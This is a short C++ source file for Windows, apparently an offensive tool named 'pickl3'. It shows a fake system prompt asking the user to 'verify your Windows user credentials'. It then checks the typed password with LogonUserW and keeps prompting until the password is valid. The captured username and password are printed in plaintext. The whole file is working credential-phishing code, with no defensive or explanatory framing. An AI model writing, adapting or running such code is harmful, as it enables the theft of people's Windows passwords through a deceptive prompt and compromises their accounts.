#include <Windows.h>
#include <tchar.h>
#include <CommCtrl.h>
#include <wincred.h>
#include <iostream>
#include <atlstr.h>

#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "Credui.lib")

void pickl3() {

	BOOL loginStatus = FALSE;
	do {
		CREDUI_INFOW credui = {};
		credui.cbSize = sizeof(credui);
		credui.hwndParent = nullptr;
		//credui.pszMessageText = L"...";
		credui.pszCaptionText = L"Please verify your Windows user credentials to proceed.";
		credui.hbmBanner = nullptr;

		ULONG authPackage = 0;
		LPVOID outCredBuffer = nullptr;
		ULONG outCredSize = 0;
		BOOL save = false;
		DWORD err = 0;

		err = CredUIPromptForWindowsCredentialsW(&credui, err, &authPackage, nullptr, 0, &outCredBuffer, &outCredSize, &save, CREDUIWIN_ENUMERATE_CURRENT_USER);
		if (err == ERROR_SUCCESS) {
			WCHAR pszUName[CREDUI_MAX_USERNAME_LENGTH * sizeof(WCHAR)];
			WCHAR pszPwd[CREDUI_MAX_PASSWORD_LENGTH * sizeof(WCHAR)];
			WCHAR domain[CREDUI_MAX_DOMAIN_TARGET_LENGTH * sizeof(WCHAR)];
			DWORD maxLenName = CREDUI_MAX_USERNAME_LENGTH + 1;
			DWORD maxLenPassword = CREDUI_MAX_PASSWORD_LENGTH + 1;
			DWORD maxLenDomain = CREDUI_MAX_DOMAIN_TARGET_LENGTH + 1;
			CredUnPackAuthenticationBufferW(CRED_PACK_PROTECTED_CREDENTIALS, outCredBuffer, outCredSize, pszUName, &maxLenName, domain, &maxLenDomain, pszPwd, &maxLenPassword);

			WCHAR parsedUserName[CREDUI_MAX_USERNAME_LENGTH * sizeof(WCHAR)];
			WCHAR parsedDomain[CREDUI_MAX_DOMAIN_TARGET_LENGTH * sizeof(WCHAR)];
			CredUIParseUserNameW(pszUName, parsedUserName, CREDUI_MAX_USERNAME_LENGTH + 1, parsedDomain, CREDUI_MAX_DOMAIN_TARGET_LENGTH + 1);

			HANDLE handle = nullptr;
			loginStatus = LogonUserW(parsedUserName, parsedDomain, pszPwd, LOGON32_LOGON_NETWORK, LOGON32_PROVIDER_DEFAULT, &handle);


			if (loginStatus == TRUE) {
				CloseHandle(handle);
				std::wcout << "\n[+] Valid credential is entered as " << pszUName << ":" << pszPwd;
				break;
			}
			else {
				std::wcout << "\n[-] Invalid credential is entered as " << pszUName << ":" << pszPwd;
				loginStatus = FALSE;
			}
		}
	} while (loginStatus == FALSE);
}



int main () {
	
	pickl3();
	return 0;
}
